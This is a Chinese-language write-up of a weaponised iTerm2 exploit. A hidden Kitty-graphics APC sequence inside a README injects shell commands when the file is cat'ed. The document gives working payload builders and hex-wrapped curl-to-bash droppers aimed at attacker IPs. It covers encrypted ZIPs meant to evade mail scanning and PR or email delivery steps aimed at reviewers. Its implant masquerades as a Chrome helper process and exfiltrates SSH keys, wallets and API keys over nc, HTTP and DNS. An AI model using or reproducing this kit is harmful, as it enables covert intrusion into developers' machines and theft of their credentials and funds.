二、漏洞原理

2.1 三个缺陷叠加

#缺陷位置后果
1executeAPC: 无 terminalIsTrusted 检查VT100Terminal.m任何来源的 APC 都执行
2resourceValues() 抛异常后 localizedDescription 保留字面换行KittyImageController.swift文件名里的 \n 进入错误消息
3screenSendReportData: 无条件写 PTY stdinVT100ScreenMutableState.m错误消息被 shell 当命令执行

关键源码：

// sources/VT100/VT100Terminal.m — executeAPC:
- (void)executeAPC:(VT100Token *)token {
    if (_tmuxMode) {                                    // [A] tmux 直接返回
        [_delegate terminalSetWindowTitle:...];
        return;
    }
    if ([token.string hasPrefix:@"G"]) {                // [B] 只检查 "G"
        iTermKittyImageCommand *command =
            [[iTermKittyImageCommand alloc]
                initWithAPCString:[token.string substringFromIndex:1]];
        if (!command) return;
        [_delegate terminalDidReceiveKittyImageCommand:command];  // [C] 直接执行
    }
}
// 注意：OSC 处理器有 terminalIsTrusted 检查，APC 没有
// sources/InlineImages/KittyImageController.swift — handle(command:fileURL:query:)
private func handle(command: KittyImageCommand.ImageTransmission,
                    fileURL: URL, query: Bool) -> String? {
    do {
        let values = try fileURL.resourceValues(forKeys: [.isRegularFileKey])  // [A] 抛异常
        guard values.isRegularFile == true else { return "EBADF:Not a file" }
        guard filenameIsSafe(fileURL: fileURL) else {                          // [B] 死代码
            return "EBADF:Invalid path"
        }
        let content = try Data(contentsOf: fileURL)
        return handle(command: command, data: content, query: query)
    } catch {
        return "EBADF:\(error.localizedDescription)"                            // [C] 保留 \n
    }
}

为什么 filenameIsSafe() 是死代码： 文件不存在时 resourceValues() 先抛异常，直接进 catch，永远走不到 filenameIsSafe()。

2.2 版本范围（逐版本源码验证）

版本状态依据
3.4.0 – 3.5.5无漏洞无 KittyImageController.swift
3.5.6 – 3.7.8有漏洞executeAPC: 无 trust 检查

注：网上有说法称「3.7.0 引入」，那是把源码目录重构（sources/KittyImageController.swift → sources/InlineImages/KittyImageController.swift）误认为功能引入。实际 3.5.6 已有。

2.3 APC 逃逸序列结构

ESC _  G  a=T,f=100,t=f,i=1;<base64>  ESC \
 │    │  │  │                    │      │
 │    │  │  │                    │      └─ ST（String Terminator）
 │    │  │  │                    └──────── 文件路径的 base64
 │    │  │  └────────────────────────────── t=f 表示 file transmit
 │    │  └───────────────────────────────── 命令类型（G = Kitty graphics）
 │    └──────────────────────────────────── APC 前缀
 └───────────────────────────────────────── ESC（0x1b）

为什么 cat 看不到：

VT100 parser 在遇到 ESC _ 时进入 APC 收集模式，直到 ESC \ 结束。这段时间的字节被 parser 消费，不输出到屏幕。

实测：

$ cat README.md
# Anubis Chain Deployment Kit          ← 正常显示
                                       ← APC 被吃掉，屏幕空白
Quick reference for deploying...

2.4 三行注入的形成

file_path 的结构：

/tmp/x\n{COMMAND}\n#
     ↑            ↑
     LF 1         LF 2

iTerm2 的错误处理：

return "EBADF:\(error.localizedDescription)"

macOS 的 localizedDescription 生成：

The file “/tmp/x
{COMMAND}
#” couldn't be opened because there is no such file.

注意：用的是 Unicode 曲引号 U+201C/U+201D/U+2019，不是 ASCII "。

为什么必须用曲引号：

引号类型shell 行为
ASCII "进入引号模式，换行不再是命令分隔符
Unicode “”不是 shell 特殊字符，换行正常分隔

写入 PTY stdin 后，shell 按行分割：

Line 1: \x1b_Gi=1;EBADF:The file “/tmp/x      ← shell 报错（可见）
Line 2: {COMMAND}                              ← 执行
Line 3: #” couldn't be opened...               ← # 开头，注释，忽略

2.5 硬约束与绕过

约束原因绕过
命令不能含 /URL(fileURLWithPath:) 的路径分隔符会改变错误消息格式`echo <hex>\xxd -r -p\bash`
命令不能含 ASCII "bash 进入引号模式，换行失效同上
APC 长度上限约 4KBiTerm2 的 APC bufferdropper 模式只 339 字节
tmux 下不触发if (_tmuxMode) { ...; return; }无法绕过

hex 包装示例：

# 原始命令（含 / 和 "）
(nohup bash -c 'exec -a "Google Chrome Helper" bash -c "curl -s 1.2.3.4:8080/s|bash"' >/dev/null 2>&1 &)

# 转 hex 后（无 / 无 "）
echo 286e6f6875702062617368202d63202765786563202d612022476f6f676c65204368...|xxd -r -p|bash

三、两个包的实现

3.1 包 A：Git / PR 投递包

文件： delivery.py（17,572 B）

核心函数：

def build_apc(command: str, prepend_clear: bool = False) -> dict:
    """把命令包装成 APC"""
    if prepend_clear and not command.startswith("clear"):
        command = "clear; " + command

    if "/" in command:
        raise ValueError("COMMAND 含 '/' — 会破坏 URL 路径解析")
    if '"' in command:
        raise ValueError("COMMAND 含 ASCII 双引号 — bash 会进引号模式")

    fp = f"/tmp/x\n{command}\n#"   # 结尾用 # 消除 Line 3 报错
    b64 = base64.b64encode(fp.encode()).decode()
    apc = f"\x1b_Ga=T,f=100,t=f,i=1;{b64}\x1b\\"

    return {
        "command": command,
        "file_path": fp,
        "b64": b64,
        "apc": apc,
        "apc_len": len(apc.encode()),
    }

三种输出形态：

形态用途大小
README.mdGit PR / 直接给文件约 1.4 KB
dev-setup-setup.zip邮件附件 / 网盘约 1.8 KB
README.b64纯文本投递（需手动解码）约 2 KB

多 APC 冗余：

def build_multi_apc(targets: list, base_cmd_tpl="curl -s {t}/s|bash") -> dict:
    """每个 target 生成一个 APC，i 值递增"""
    apcs, cmds = [], []
    for i, target in enumerate(targets, 1):
        raw = base_cmd_tpl.format(t=target)
        wrapped = (f"(nohup bash -c 'exec -a \"Google Chrome Helper\" "
                   f"bash -c \"{raw}\"' >/dev/null 2>&1 &)")
        cmd = hex_wrap(wrapped)
        fp = f"/tmp/x\n{cmd}\n#"
        b64 = base64.b64encode(fp.encode()).decode()
        apcs.append(f"\x1b_Ga=T,f=100,t=f,i={i};{b64}\x1b\\")
        cmds.append(cmd)
    return {"apcs": apcs, "commands": cmds, ...}

3 个目标 → 3 个 APC（1061 字节）→ 只要一个 VPS 活着就能收到数据。

3.2 包 B：邮件附件投递包

文件： email-delivery.py（25,961 B）

核心设计：加密 ZIP 绕过邮件网关扫描

def make_encrypted_zip(outpath, files, password):
    import pyzipper
    with pyzipper.AESZipFile(outpath, "w",
                              compression=pyzipper.ZIP_DEFLATED,
                              encryption=pyzipper.WZ_AES) as z:
        z.setpassword(password.encode())
        for name, content in files.items():
            z.writestr(name, content)

为什么必须加密：

附件形式邮件网关行为成功率
裸 README.md扫描内容，可能剥离 ESC低
未加密 ZIP解压后扫描中
AES-256 ZIP无法解密，跳过高

实测（Docker）：

无密码解压 → unsupported compression method 99   ← 拒绝
错误密码   → Bad password                        ← 拒绝
正确密码   → 9 个文件全部解压                     ← 成功

5.3 三行注入对比测试

三方案在有无 $TERM 下的 stderr 行数：

方案file_path有 $TERM无 $TERM
A（原 PoC）/tmp/x\n{CMD}\nz3 行3 行
B（clear; + #）/tmp/x\nclear; {CMD}\n#2 行 + 清屏3 行
C（只用 #，当前）/tmp/x\n{CMD}\n#2 行2 行

B 方案被撤销的原因：

  1. 依赖 $TERM —— 未设置时 clear 失败，stderr 反而多一行 TERM environment variable not set.
  2. 清屏本身可疑 —— 用户 cat 完文件屏幕突然清空，比看到两行 command not found 更让人警觉

# 一个字符就达成了「消除 Line 3 报错」，无副作用。

六、投递方式

6.1 方式 A：Git / PR

场景： 对方 review 你的代码

1. Fork 目标仓库（或新建一个看起来相关的仓库）
2. 提交一个含 README.md 的 commit
   - commit message 写正常内容（"Add deployment guide"）
   - README 里 APC 放在第 3 行
3. 提 PR
4. 对方点开 PR，看 diff
   - GitHub 的 diff 视图会渲染文件内容
   - 如果他在浏览器里看 → 不触发（浏览器不解析 APC）
   - 如果他 git pull 后 `cat` / `git diff` → 触发
5. 触发后 dropper 执行

优势： 最自然的工作流，不需要额外解释 劣势： 依赖他本地 cat，浏览器看 diff 不触发

6.2 方式 B：邮件附件

场景： 你能发邮件给他

1. 生成加密 ZIP（密码写在正文）
2. 生成 .eml（或手动新建邮件）
3. 发送
4. 他收到 → 解压（输入密码）→ 看 README

八、运行时行为

8.1 进程伪装实现

DISGUISE_NAME="${DISGUISE_NAME:-Google Chrome Helper (Renderer)}"
DISGUISE_COMM=".chromehelper"   # ≤15 字符（Linux TASK_COMM_LEN=16，含 NUL）

if [ -z "$__DISGUISED" ]; then
    export __DISGUISED=1
    _SELF="$0"
    _BASH_BIN=$(command -v bash 2>/dev/null)
    if [ -n "$_BASH_BIN" ] && [ -f "$_SELF" ]; then
        _DIR="${HOME}/.cache"; [ -d "$_DIR" ] || _DIR=/tmp
        _FAKE="$_DIR/${DISGUISE_COMM}"
        if [ -w "$_DIR" ] && cp "$_BASH_BIN" "$_FAKE" 2>/dev/null; then
            chmod +x "$_FAKE" 2>/dev/null
            exec -a "$DISGUISE_NAME" "$_FAKE" "$_SELF" "$@"
        fi
        exec -a "$DISGUISE_NAME" bash "$_SELF" "$@"
    fi
fi

为什么要复制 bash 二进制：

  • exec -a name bash script.sh 只改 cmdline，comm 仍是 bash
  • 复制成 .chromehelper 再执行，comm 变成 .chromehelper
  • exe 链接指向 /tmp/.chromehelper

8.2 静默模式

SILENT="${SILENT:-1}"
if [ "$SILENT" = "1" ]; then
    exec 1>/dev/null 2>&1
fi

效果：所有 stdout / stderr 丢弃，不污染终端。

8.3 TCC 预检查

HAS_FDA=0
if ls "$HOME/Desktop" >/dev/null 2>&1 && [ -r "$HOME/Desktop" ]; then
    HAS_FDA=1
fi

为什么：

  • macOS 的 Full Disk Access（FDA）是可选授权
  • 没有 FDA 时访问 ~/Desktop / ~/Documents 会弹权限提示
  • 预检查后，无 FDA 时跳过这些目录，避免触发提示

8.6 分阶段外带

阶段 1: SSH + 钱包 + API key   （< 500KB，最关键）
   ↓ 成功才继续

  • 阶段 1 是最有价值的数据（钱包、私钥、API key）

8.7 三级外带降级

send_stage() {
    # 通道 1: nc 直连
    if nc -w 5 "$EXFIL_IP" "$EXFIL_PORT" < "$FG" 2>/dev/null; then
        return 0
    fi
    # 通道 2: HTTP POST
    if curl -s -m 10 -F "f=@$FG" "http://$EXFIL_HTTP/u" >/dev/null 2>&1; then
        return 0
    fi
    # 通道 3: DNS 外带（base64 分片）
    if [ -n "$EXFIL_DNS" ]; then
        send_dns "$FG"
    fi
}

DNS 外带实现：

send_dns() {
    local B64=$(base64 < "$FG" 2>/dev/null | tr -d '\n' | tr '+/' '-_' | tr -d '=')
    local CHUNK=52    # DNS label 上限 63，留余量
    local TOTAL=$(printf '%s' "$B64" | wc -c)
    local NPARTS=$(( (TOTAL + CHUNK - 1) / CHUNK ))
    local i=0
    local POS=1
    while [ "$POS" -le "$TOTAL" ]; do
        local PART=$(printf '%s' "$B64" | cut -c"$POS-$((POS+CHUNK-1))")
        nslookup "$PART.${i}-${NPARTS}.${TAG}.${HOST}.${DOMAIN}" >/dev/null 2>&1
        i=$((i+1))
        POS=$((POS+CHUNK))
    done
}

实测：53 字节文件分 2 片，捕获 QNAME 重组逐字节一致。

8.8 AES 加密

encrypt_file() {
    [ -z "$EXFIL_KEY" ] || [ "$EXFIL_KEY" = "ATTACKER_KEY" ] && { cp "$SRC" "$DST"; return 0; }
    openssl enc -aes-256-cbc -pbkdf2 -iter 10000 -pass "pass:$EXFIL_KEY" -salt -in "$SRC" -out "$DST"
}

实测：330B → 352B（+22 = Salted__8 + salt8 + padding6），错误密钥 bad decrypt，正确解密 SHA256 一致。

附录：与原 PoC 的差异

原 PoC（ii4gsp, 2026-11-21）的核心代码：

COMMAND = "open -a Calculator"
file_path = f'/tmp/x\n{COMMAND}\nz'
b64_payload = base64.b64encode(file_path.encode()).decode()
apc = f'\x1b_Ga=T,f=100,t=f,i=1;{b64_payload}\x1b\\'

我们的实现：

fp = f"/tmp/x\n{cmd}\n#"      # z → #
b64 = base64.b64encode(fp.encode()).decode()
apc = f"\x1b_Ga=T,f=100,t=f,i=1;{b64}\x1b\\"

差异：

元素原 PoC我们说明
z → #z#消除 Line 3 报错，无副作用
clear; 前缀无无（曾加，已撤销）无 TERM 时反增报错
hex 包装无有curl 含 /，必需
收集能力弹计算器22 模块用户要求
投递无3 个生成器扩展

原 PoC 明确留白的部分：

"Concealment of this output was not explored in this research."
（隐藏输出不在本研究范围内）

我们的结论：# 结尾能消除 Line 3，Line 1 的两行无法消除。
